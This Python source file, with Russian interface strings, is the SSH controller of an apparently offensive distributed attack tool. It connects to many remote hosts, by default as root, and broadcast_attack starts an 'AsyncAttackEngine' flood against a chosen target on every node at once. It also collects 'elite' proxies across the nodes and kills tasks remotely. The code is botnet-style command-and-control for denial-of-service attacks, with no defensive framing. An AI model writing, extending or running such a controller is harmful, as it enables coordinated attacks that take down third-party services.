import paramiko, time, threading

class SSHNode:
    def __init__(self, host, port=22, username='root', password=None, key_file=None):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.key_file = key_file
        self.client = None
        self.connected = False
        self.task = None           # 'attack', 'proxy', None
        self.task_start = 0
        self.task_params = {}
        self.running = False
        self.rps = 0
        self.total = 0

    def connect(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if self.key_file:
                self.client.connect(self.host, port=self.port, username=self.username, key_filename=self.key_file, timeout=8)
            else:
                self.client.connect(self.host, port=self.port, username=self.username, password=self.password, timeout=8)
            self.connected = True
            return True
        except Exception as e:
            self.connected = False
            return str(e)

    def disconnect(self):
        if self.client:
            self.client.close()
            self.connected = False
            self.task = None
            self.running = False

    def exec_command(self, cmd, timeout=10):
        if not self.connected:
            return "Не подключён"
        try:
            stdin, stdout, stderr = self.client.exec_command(cmd, timeout=timeout)
            return stdout.read().decode() + stderr.read().decode()
        except Exception as e:
            return str(e)

    def start_attack(self, target, method, threads):
        if not self.connected:
            return
        self.task = 'attack'
        self.task_start = time.time()
        self.task_params = {'target': target, 'method': method, 'threads': threads}
        self.rps = 0
        self.total = 0
        self.running = True
        cmd = f"python3 -c \"from engine.attack import AsyncAttackEngine; e=AsyncAttackEngine([], 80); e.launch('{target}', '{method}', {threads})\" &"
        self.exec_command(cmd)

    def start_proxy_gather(self, speed_limit=2.0, geo_filter='', elite_only=False):
        if not self.connected:
            return
        self.task = 'proxy'
        self.task_start = time.time()
        self.task_params = {'speed': speed_limit, 'geo': geo_filter, 'elite': elite_only}
        self.rps = 0
        self.running = True
        cmd = f"python3 -c \"from engine.proxy import ProxyManager; pm=ProxyManager(); pm.gather({speed_limit}, '{geo_filter}', {elite_only}, True)\" &"
        self.exec_command(cmd)

    def stop_task(self):
        self.running = False
        if self.client:
            try:
                self.client.exec_command('pkill -f AsyncAttackEngine; pkill -f ProxyManager', timeout=5)
            except:
                pass
        self.task = None

    def get_status_text(self):
        if not self.connected:
            return '✗ Офлайн'
        if self.task == 'attack':
            elapsed = int(time.time() - self.task_start)
            return f'⚡ Атака {elapsed}с'
        elif self.task == 'proxy':
            elapsed = int(time.time() - self.task_start)
            return f'🌐 Прокси {elapsed}с'
        else:
            return '✓ Онлайн'

class SSHManager:
    def __init__(self, log_func=None):
        self.log = log_func or print
        self.nodes = []

    def add_node(self, host, port, username, password=None, key_file=None):
        node = SSHNode(host, port, username, password, key_file)
        self.nodes.append(node)
        return node

    def remove_node(self, index):
        if 0 <= index < len(self.nodes):
            node = self.nodes.pop(index)
            node.disconnect()
            return True
        return False

    def get_nodes(self):
        return self.nodes

    def find_node(self, host, port):
        for node in self.nodes:
            if node.host == host and node.port == port:
                return node
        return None

    def broadcast_attack(self, target, method, threads):
        for node in self.nodes:
            if node.connected:
                node.start_attack(target, method, threads)

    def broadcast_proxy(self, speed, geo, elite):
        for node in self.nodes:
            if node.connected:
                node.start_proxy_gather(speed, geo, elite)

    def stop_all(self):
        for node in self.nodes:
            node.stop_task()

    def disconnect_all(self):
        for node in self.nodes:
            node.disconnect()
